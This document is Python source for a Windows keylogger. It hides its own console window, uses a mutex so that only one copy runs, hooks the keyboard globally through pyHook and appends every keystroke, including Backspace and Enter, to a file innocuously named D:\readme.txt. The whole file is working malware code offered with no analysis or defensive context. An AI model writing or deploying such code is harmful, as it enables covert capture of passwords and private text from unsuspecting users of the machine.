import win32event
import winerror
import win32api
import win32console
import win32gui
import pythoncom, pyHook
global buffer

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

f = open('D:\\readme.txt', 'a')
f.write('---logstart---')
f.close()
    
def keypressed(event):
    
        f = open('D:\\readme.txt', 'r')
        buffer = f.read()
        f.close()
        #
        f = open('D:\\readme.txt', 'w')
        #
        if event.Ascii == 8:
            keylogs = 'BACKSPACE'
            buffer +=keylogs
            f.write(buffer)
            f.close
        elif event.Ascii == 13:
            keylogs = 'ENTER'
            buffer +=keylogs
            f.write(buffer)
            f.close
        else:
            keylogs = chr(event.Ascii)
            buffer +=keylogs
            f.write(buffer)
            f.close
            
        return True
#
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
